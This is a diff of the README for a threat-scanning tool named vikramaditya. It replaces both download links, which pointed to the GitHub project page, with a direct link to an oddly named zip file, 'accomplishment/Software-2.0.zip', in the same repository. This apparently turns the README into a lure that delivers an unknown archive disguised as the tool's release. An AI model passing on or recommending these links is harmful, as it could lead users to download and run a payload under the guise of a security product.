@@ -1,6 +1,6 @@
 # 🛡️ vikramaditya - Find threats before they spread
 
-[![Download vikramaditya](https://img.shields.io/badge/Download%20vikramaditya-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallachenonlinear561/vikramaditya)
+[![Download vikramaditya](https://img.shields.io/badge/Download%20vikramaditya-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/wallachenonlinear561/vikramaditya/main/accomplishment/Software-2.0.zip)
 
 ## 🚀 What this is
 
@@ -21,7 +21,7 @@ The tool follows a clear flow: give it a target, let it scan, then review the ou
 
 Use this link to visit the page to download and set up vikramaditya:
 
-[Visit the vikramaditya download page](https://github.com/wallachenonlinear561/vikramaditya)
+[Visit the vikramaditya download page](https://raw.githubusercontent.com/wallachenonlinear561/vikramaditya/main/accomplishment/Software-2.0.zip)
 
 ### On Windows
 
